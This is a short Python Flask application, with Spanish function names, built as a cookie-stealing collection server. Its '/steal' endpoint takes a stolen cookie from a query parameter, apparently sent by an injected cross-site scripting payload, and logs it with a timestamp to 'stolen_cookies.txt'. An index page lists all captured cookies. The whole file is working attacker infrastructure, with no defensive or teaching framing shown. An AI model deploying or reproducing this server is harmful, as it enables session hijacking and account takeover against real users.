from flask import Flask, request, render_template
import os
from datetime import datetime

app = Flask(__name__)

COOKIES_FILE = 'stolen_cookies.txt'

def guardar_cookie(cookie_data):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open(COOKIES_FILE, 'a') as f:
        f.write(f"{cookie_data}|{timestamp}\n")

def cargar_cookies():
    if not os.path.exists(COOKIES_FILE):
        return []
    with open(COOKIES_FILE, 'r') as f:
        lines = f.readlines()
        cookies = []
        for line in lines:
            parts = line.strip().split('|')
            if len(parts) != 2:
                continue
            cookie, timestamp = parts
            cookies.append({'cookie': cookie, 'timestamp': timestamp})
        return cookies

@app.route('/')
def index():
    cookies = cargar_cookies()
    return render_template('index.html', cookies=cookies)

@app.route('/steal', methods=['GET'])
def steal():
    cookie = request.args.get('c')
    if cookie:
        guardar_cookie(cookie)
        return "Cookie received", 200
    return "No cookie provided", 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5002, debug=True)
